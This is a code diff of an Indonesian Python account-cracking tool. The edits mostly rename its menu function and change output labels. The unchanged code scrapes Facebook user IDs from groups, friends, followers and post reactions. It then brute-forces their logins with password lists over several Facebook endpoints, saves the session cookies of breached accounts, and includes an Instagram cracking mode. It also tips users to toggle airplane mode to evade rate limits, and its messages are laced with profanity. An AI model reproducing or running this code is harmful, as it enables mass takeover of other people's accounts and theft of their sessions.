@@ -100,7 +100,7 @@ def _Yumasa_X_Nano_(z):
 		time.sleep(0.04)
 
 
-  
+
 def login():
 #    os.system('clear')
     banner()
@@ -332,7 +332,7 @@ def target():
     _Yumasa_X_Nano_("[•] \x1b[1;97mAbout : " + ab)
     _Yumasa_X_Nano_("[•] \x1b[1;97mLocale : " + lo)
     input("\n\x1b[1;93m[ \x1b[1;96mBack ]")
-    moch_yayan
+    menu()
 
 
 def hasil(ok,cp):
@@ -366,7 +366,7 @@ def hasil(ok,cp):
                 print("")
             print("")
             print('   [ %s\x1b[1;93mProses Pengecekan Selesai %s]\n'%(H,N))
-            input(' [ %s\x1b[1;96mKEMBALI%s ] '%(O,N));moch_yayan()
+            input(' [ %s\x1b[1;96mKEMBALI%s ] '%(O,N));menu()
         elif cek_cp in["T","t"]:
             exit(f"\n  {O}*{N} \x1b[1;91mSelamat tinggal:)")
         else:
@@ -391,14 +391,14 @@ def yayanxd():
         print(' %s*%s \x1b[1;96mmohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N));time.sleep(1)
         input(' %s*%s \x1b[1;96mtekan enter '%(O,N))
         os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
-        moch_yayan()
+        menu()
     except AttributeError:
         print('\n %s[%s×%s] \x1b[1;91mcookies invalid'%(N,M,N));time.sleep(1);yayanxd()
     except UnboundLocalError:
         print('\n %s[%s×%s] \x1b[1;91mcookies invalid'%(N,M,N));time.sleep(1);yayanxd()
     except requests.exceptions.ConnectionError:
         exit('\n\n %s[%s!%s] \x1b[1;91mtidak ada koneksi\n'%(N,M,N))
-def moch_yayan():
+def menu():
     os.system('clear')
     logo()
     try:
@@ -430,20 +430,20 @@ def moch_yayan():
     print(' \x1b[1;93m[%s\x1b[1;91m00%s\x1b[1;93m] [%sDelete Cokies%s]'%(M,N,M,N));time.sleep(0.03)
     pepek = input('\n [%s*%s] menu : '%(H,N))
     if pepek == '':
-        print('\n %s[%s×%s]\x1b[1;91m jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
+        print('\n %s[%s×%s]\x1b[1;91m jangan kosong kentod!'%(N,M,N));time.sleep(2);menu()
     elif pepek in['1','01']:
         kontol = input(f"{N} [?] \x1b[1;93mmasukkan id grup : ")
         if kontol in[""," "]:
-            print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
+            print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);menu()
         else:
             try:
                 ajg=requests.get(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}",cookies=kueh).text
                 if "Halaman Tidak Ditemukan" in ajg:
-                    print(f"\n %s[%s×%s] \x1b[1;93mgroup dengan id {kontol} tidak ditemukan"%(N,M,N));time.sleep(2);moch_yayan()
+                    print(f"\n %s[%s×%s] \x1b[1;93mgroup dengan id {kontol} tidak ditemukan"%(N,M,N));time.sleep(2);menu()
                 elif "\x1b[1;93mAnda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
-                    print("\n %s[%s×%s] \x1b[1;93mfacebook membatasi setiap aktivitas, limit bro, silahkan beralih akun"%(N,M,N));time.sleep(2);moch_yayan()
+                    print("\n %s[%s×%s] \x1b[1;93mfacebook membatasi setiap aktivitas, limit bro, silahkan beralih akun"%(N,M,N));time.sleep(2);menu()
                 elif "\x1b[1;91mKonten Tidak Ditemukan" in ajg:
-                    print(f"\n %s[%s×%s] \x1b[1;93mgroup dengan id {kontol} tidak ditemukan"%(N,M,N));time.sleep(2);moch_yayan()
+                    print(f"\n %s[%s×%s] \x1b[1;93mgroup dengan id {kontol} tidak ditemukan"%(N,M,N));time.sleep(2);menu()
                 else:
                     print(" [*] \x1b[1;96mnama grup : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
                     print("\n [!] \x1b[1;96muntuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
@@ -458,25 +458,25 @@ def moch_yayan():
             for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(_memek_.get('_kontol_'),kontol)).json()["data"]:
                 id.append(a['id'] + '<=>' + a['name'])
         except KeyError:
-            print('\n %s[%s×%s] \x1b[1;91mgagal mengambil id, kemungkinan id tidaklah publik'%(N,M,N));time.sleep(3);moch_yayan()
+            print('\n %s[%s×%s] \x1b[1;91mgagal mengambil id, kemungkinan id tidaklah publik'%(N,M,N));time.sleep(3);menu()
     elif pepek in['3','03']:
         kontol = input(f"{N} [?] \x1b[1;96mmasukan id atau username followers : ")
         if kontol in[""," "]:
-            print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
+            print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);menu()
         try:
             print("\n [!] \x1b[1;93muntuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
             followers(f"https://mbasic.facebook.com/subscribe/lists/?id={kontol}")
         except KeyError:
-            print(f"\n [!] \x1b[1;93mWhy {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
+            print(f"\n [!] \x1b[1;93mWhy {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);menu()
     elif pepek in['4','04']:
         kontol = input(f"{N} [?] \x1b[1;96mmasukan id postingan : ")
         if kontol in[""," "]:
-            print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
+            print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);menu()
         try:
             print("\n [!] \x1b[1;93muntuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
             like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}")
         except KeyError:
-            print(f"\n [!]\x1b[1;93m Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
+            print(f"\n [!]\x1b[1;93m Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);menu()
     elif pepek in['5','05']:
         _ngocok_(kontol)
     elif pepek in['11']:
@@ -485,12 +485,12 @@ def moch_yayan():
     elif pepek in['6','06']:
         kontol = input(f"{N} [?] \x1b[1;93mmasukan id postingan : ")
         if kontol in[""," "]:
-            print('\n %s[%s×%s]\x1b[1;91m jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
+            print('\n %s[%s×%s]\x1b[1;91m jangan kosong kentod!'%(N,M,N));time.sleep(2);menu()
         try:
             print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
             ngomen_post(f"https://mbasic.facebook.com/{kontol}")
         except KeyError:
-            print(f"\n [!]\x1b[1;93m Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
+            print(f"\n [!]\x1b[1;93m Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);menu()
     elif pepek in['7','07']:
         log_igeh()
         menu_igeh()
@@ -517,7 +517,7 @@ def moch_yayan():
             titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
             print("%s%s"%(titid,N));time.sleep(0.03)
         print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
-        input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        input('\n  [ %sKEMBALI%s ] '%(O,N));menu()
     elif pepek in['0','00']:
         print("")
         titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
@@ -527,12 +527,12 @@ def moch_yayan():
         os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
         exit('\n %s[%s✓%s]%s\x1b[1;91m berhasil menghapus cookie'%(N,M,N,H))
     else:
-        print('\n %s[%s×%s]\x1b[1;93m menu [%s%s%s]\x1b[1;93m tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N));time.sleep(2);moch_yayan()
+        print('\n %s[%s×%s]\x1b[1;93m menu [%s%s%s]\x1b[1;93m tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N));time.sleep(2);menu()
     if len(id)!=0:
         print("")
         return __crack__().plerr(id)
     else:
-        print("\n %s[%s×%s] \x1b[1;91mgagal mengambil id, silahkan coba lagi"%(N,M,N));time.sleep(2);moch_yayan()
+        print("\n %s[%s×%s] \x1b[1;91mgagal mengambil id, silahkan coba lagi"%(N,M,N));time.sleep(2);menu()
 def seting_yntkts():
     print('\n (%s1%s) \x1b[1;93mganti user agent'%(O,N))
     print(' (%s2%s) \x1b[1;93mcheck user agent'%(O,N))
@@ -547,7 +547,7 @@ def seting_yntkts():
         except IOError:
             user_agent = '%s-'%(M)
         print('\n %s[%s+%s]\x1b[1;96m User Agent anda : %s%s'%(N,O,N,H,user_agent))
-        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
+        input('\n  %s[ %skembali%s ]'%(N,O,N));menu()
     else:
         print('\n %s[%s×%s]\x1b[1;91m input yang bener'%(N,M,N));time.sleep(2);seting_yntkts()
 def yo_ndak_tau_ko_tanya_saia():
@@ -560,12 +560,12 @@ def yo_ndak_tau_ko_tanya_saia():
         _agen_ = input(' [%s?%s] \x1b[1;96mmasukan user agent hp anda :%s '%(O,N,H))
         open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
         jalan('\n %s[%s✓%s] \x1b[1;92mberhasil menggunakan user agent hp anda...'%(N,H,N))
-        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
+        input('\n  %s[ %skembali%s ]'%(N,O,N));menu()
     elif _asu_ in['T','t']:
         _agen_ = input(' [%s?%s] \x1b[1;96mmasukan user agent :%s '%(O,N,H))
         open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
         jalan('\n %s[%s✓%s] \x1b[1;92mberhasil mengganti user agent...'%(N,H,N))
-        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
+        input('\n  %s[ %skembali%s ]'%(N,O,N));menu()
     else:
         print('\n %s[%s!%s] \x1b[1;91mY/t ngentod'%(N,M,N));yo_ndak_tau_ko_tanya_saia()
 def crack_grup(hencet):
@@ -611,7 +611,7 @@ def like_post(hencet):
         kueh  = {"cookie":_mmk_}
         kontol=requests.get(hencet,cookies=kueh).text
         if "Semua 0" in kontol:
-            print("\n [!] \x1b[1;91mTidak ada yang menanggapi postingan, awokawokawok kasian akun nya sepi:v");time.sleep(2);moch_yayan()
+            print("\n [!] \x1b[1;91mTidak ada yang menanggapi postingan, awokawokawok kasian akun nya sepi:v");time.sleep(2);menu()
         else:
             memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
             for softek in memek:
@@ -677,7 +677,7 @@ def _ngocok_(__ppk__):
                 nama = a["name"]
                 id.append(uid+"<=>"+nama)
         except (KeyError,IOError):
-            print('\n [×] \x1b[1;91mgagal mengambil id, kemungkinan id tidaklah publik');time.sleep(3);moch_yayan()
+            print('\n [×] \x1b[1;91mgagal mengambil id, kemungkinan id tidaklah publik');time.sleep(3);menu()
 def __convert__(user):
     if user == "me":
         return {"_kontol_":user}
@@ -700,7 +700,7 @@ def gabut():
     try:
         buka_baju = open(f'results/{files}','r').readlines()
     except IOError:
-        print('\n [!] file tidak ada');time.sleep(2);moch_yayan()
+        print('\n [!] file tidak ada');time.sleep(2);menu()
     ww=input(f"\n {N}[{O}?{N}] \x1b[1;97mubah password ketika tap yes [Y/t]: ")
     if ww in ("Y","y","ya"):
         ubahP.append("y")
@@ -723,7 +723,7 @@ def gabut():
         print("")
     print("")
     print('   [ %sProses Pengecekan Selesai %s]\n'%(H,N))
-    input(' [ %sKEMBALI%s ] '%(O,N));os.system(f"rm -rf {buka_baju}");moch_yayan()
+    input(' [ %sKEMBALI%s ] '%(O,N));os.system(f"rm -rf {buka_baju}");menu()
 def log_hasil(user, pasw):
     global aman,cp,salah
     session=requests.Session()
@@ -871,7 +871,7 @@ class __crack__:
                         elif cin == '3':
                             print('\n [%s+%s] \x1b[1;92mhasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                             print(' [%s+%s] \x1b[1;93mhasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
-                            print('\n [%s!%s] \x1b[1;97manda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
+                            print('\n [%s!%s] \x1b[1;97mMainkan Mode pesawat 5 detik jika tidak ada hasil\n'%(M,N))
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -882,23 +882,23 @@ class __crack__:
                         else:
                             print('\n %s[%s×%s]\x1b[1;91m input yang bener'%(N,M,N));__yan__()
                     print('\n \x1b[1;97m[ pilih method login - silahkan coba satu² ]\n')
-                    print(' [%s01%s]. \x1b[1;93mmethod API \x1b[1;96m[fast]'%(O,N))
-                    print(' [%s02%s]. \x1b[1;93mmethod mbasic \x1b[1;96m[slow]'%(O,N))
-                    print(' [%s03%s]. \x1b[1;93mmethod mobile \x1b[1;96m[super slow]'%(O,N))
+                    print(' [%s01%s]. \x1b[1;93mmethod API \x1b[1;96m[\x1b[1;97mfast\x1b[1;96m]'%(O,N))
+                    print(' [%s02%s]. \x1b[1;93mmethod mbasic \x1b[1;96m[\x1b[1;97mslow\x1b[1;96m]'%(O,N))
+                    print(' [%s03%s]. \x1b[1;93mmethod mobile \x1b[1;96m[\x1b[1;97msuper slow\x1b[1;96m]'%(O,N))
                     __yan__(pwek.split(','))
                     break
         elif ___yayanganteng___ in ('T', 't'):
                     print('\n \x1b[1;97m[ pilih method login - silahkan coba satu² ]\n')
-                    print(' [%s01%s]. \x1b[1;93mmethod API \x1b[1;96m[fast]'%(O,N))
-                    print(' [%s02%s]. \x1b[1;93mmethod mbasic \x1b[1;96m[slow]'%(O,N))
-                    print(' [%s03%s]. \x1b[1;93mmethod mobile \x1b[1;96m[super slow]'%(O,N))
+                    print(' [%s01%s]. \x1b[1;93mmethod API \x1b[1;96m[\x1b[1;97mfast\x1b[1;96m]'%(O,N))
+                    print(' [%s02%s]. \x1b[1;93mmethod mbasic \x1b[1;96m[\x1b[1;97mslow\x1b[1;96m]'%(O,N))
+                    print(' [%s03%s]. \x1b[1;93mmethod mobile \x1b[1;96m[\x1b[1;97msuper slow\x1b[1;96m]'%(O,N))
                     self.__pler__()
         else:
             print('\n %s[%s×%s] \x1b[1;91my/t goblok!'%(N,M,N));self.plerr(id)
     def __api__(self, user, __yan__):
         global ok,cp,loop
         for i in list('\|-/'):
-            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
+            sys.stdout.write('\r [%s%s%s] [Sanz] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
             sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -919,7 +919,7 @@ class __crack__:
                 self.__api__()
             if 'session_key' in response.text and 'EAAA' in response.text:
                 coki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])
-                print('\r %s[OKEH] %s|%s|%s                 %s' % (H,user,pw,coki,N))
+                print('\r %s[OK] %s|%s|%s                 %s' % (H,user,pw,coki,N))
                 wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -930,7 +930,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print('\r %s[CEPEH] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
+                    print('\r %s[CP] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -941,7 +941,7 @@ class __crack__:
                     year  = ''
                 except:
                     pass
-                print('\r %s[CEPEH] %s|%s                %s' % (K,user,pw,N))
+                print('\r %s[CP] %s|%s                %s' % (K,user,pw,N))
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -952,7 +952,7 @@ class __crack__:
     def __mbasic__(self, user, __yan__):
         global ok,cp,loop
         for i in list('\|-/'):
-            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
+            sys.stdout.write('\r [%s%s%s] [Sanz] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
             sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -968,7 +968,7 @@ class __crack__:
             b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if 'c_user' in ses.cookies.get_dict().keys():
                 coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print('\r %s[OKEH] %s|%s|%s                 %s' % (H,user,pw,coki,N))
+                print('\r %s[OK] %s|%s|%s                 %s' % (H,user,pw,coki,N))
                 wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -979,7 +979,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print('\r  %s[CEPEH] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
+                    print('\r  %s[CP] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -990,7 +990,7 @@ class __crack__:
                     year  = ''
                 except:
                     pass
-                print('\r %s[CEPEH] %s|%s                %s' % (K,user,pw,N))
+                print('\r %s[CP] %s|%s                %s' % (K,user,pw,N))
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -1001,7 +1001,7 @@ class __crack__:
     def __mfb__(self, user, __yan__):
         global ok,cp,loop
         for i in list('\|-/'):
-            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
+            sys.stdout.write('\r [%s%s%s] [Sanz] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
             sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -1017,7 +1017,7 @@ class __crack__:
             b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if 'c_user' in ses.cookies.get_dict().keys():
                 coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print('\r  %s[OKEH] %s|%s|%s                 %s' % (H,user,pw,coki,N))
+                print('\r  %s[OK] %s|%s|%s                 %s' % (H,user,pw,coki,N))
                 wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -1028,7 +1028,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print('\r  %s[CEPEH] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
+                    print('\r  %s[CP] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -1039,7 +1039,7 @@ class __crack__:
                     year  = ''
                 except:
                     pass
-                print('\r %s[CEPEH] %s|%s                %s' % (K,user,pw,N))
+                print('\r %s[CP] %s|%s                %s' % (K,user,pw,N))
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -1054,7 +1054,7 @@ class __crack__:
         elif yan in ('1', '01'):
             print('\n [%s+%s] \x1b[1;92mhasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
             print(' [%s+%s] \x1b[1;93mhasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
-            print('\n [%s!%s] \x1b[1;97manda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
+            print('\n [%s!%s] \x1b[1;97mMainkan Mode pesawat 5 detik jika tidak ada hasil\n'%(M,N))
             with YayanGanteng(max_workers=30) as kirim:
                 for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -1071,7 +1071,7 @@ class __crack__:
         elif yan in ('2', '02'):
             print('\n [%s+%s] \x1b[1;92mhasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
             print(' [%s+%s] \x1b[1;93mhasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
-            print('\n [%s!%s] \x1b[1;97manda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
+            print('\n [%s!%s] \x1b[1;97mMainkan Mode pesawat 5 detik jika tidak ada hasil\n'%(M,N))
             with YayanGanteng(max_workers=30) as kirim:
                 for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -1088,7 +1088,7 @@ class __crack__:
         elif yan in ('3', '03'):
             print('\n [%s+%s] \x1b[1;92mhasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
             print(' [%s+%s] \x1b[1;93mhasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
-            print('\n [%s!%s] \x1b[1;97manda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
+            print('\n [%s!%s] \x1b[1;97mMainkan Mode pesawat 5 detik jika tidak ada hasil\n'%(M,N))
             with YayanGanteng(max_workers=30) as kirim:
                 for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -1118,7 +1118,7 @@ param = {}
 def proses():
     print('\n\n %s[%s+%s] \x1b[1;92mhasil OK disimpan ke -> results/IG-OK-%s-%s-%s.txt'%(N,O,N,ha, op, ta));time.sleep(0.2)
     print(' [%s+%s] \x1b[1;93mhasil CP disimpan ke -> results/IG-CP-%s-%s-%s.txt'%(O,N,ha, op, ta));time.sleep(0.2)
-    print('\n [%s!%s] \x1b[1;93mtekan ctrl+z di keyboard anda untuk menjeda proses crack\n'%(M,N));time.sleep(0.2)
+    print('\n [%s!%s] \x1b[1;97mtekan ctrl+z di keyboard anda untuk menjeda proses crack\n'%(M,N));time.sleep(0.2)
 def log_igeh():
     global cookie
     try:
@@ -1241,7 +1241,7 @@ def menu_igeh():
         print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
         input('\n  [ %sKEMBALI%s ] '%(O,N));menu_igeh()
     elif pepek in['0','00']:
-        moch_yayan()
+        menu()
     else:
         print('\n %s[%s×%s] menu [%s%s%s] \x1b[1;93mtidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N));time.sleep(2);menu_igeh()
 def __followers__(cookie, id_target, limit, kuntul):
@@ -1368,5 +1368,5 @@ def ingfo(user, pw, status):
 loping= 1
 if __name__ == '__main__':
     os.system('git pull')
-    moch_yayan()
+    menu()
 # Mau Ngapain Cuk?
